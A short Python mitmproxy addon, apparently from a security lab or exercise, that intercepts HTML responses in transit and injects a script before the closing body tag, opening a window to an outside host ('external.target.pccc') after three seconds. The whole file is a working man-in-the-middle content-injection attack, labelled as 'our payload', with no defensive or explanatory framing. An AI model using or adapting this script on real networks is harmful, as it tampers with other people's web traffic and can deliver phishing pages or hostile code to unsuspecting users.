from mitmproxy import http

# Our payload, condensed
INJECTED_JS = """
<script>setTimeout(() => {window.open("http://external.target.pccc", "_blank");},3000);</script>
"""

# Function we define to hook incoming HTTP responses
def response(flow: http.HTTPFlow) -> None:
    # Only modify HTML responses
    if "text/html" in flow.response.headers.get("content-type", ""):
        text = flow.response.get_text()  # Retrieve the HTML
        if "</body>" in text:  # Find the end of the HTML
            # Place our script at the end
            text = text.replace("</body>", INJECTED_JS + "</body>")
            # Finalize change to the flow
            flow.response.set_text(text)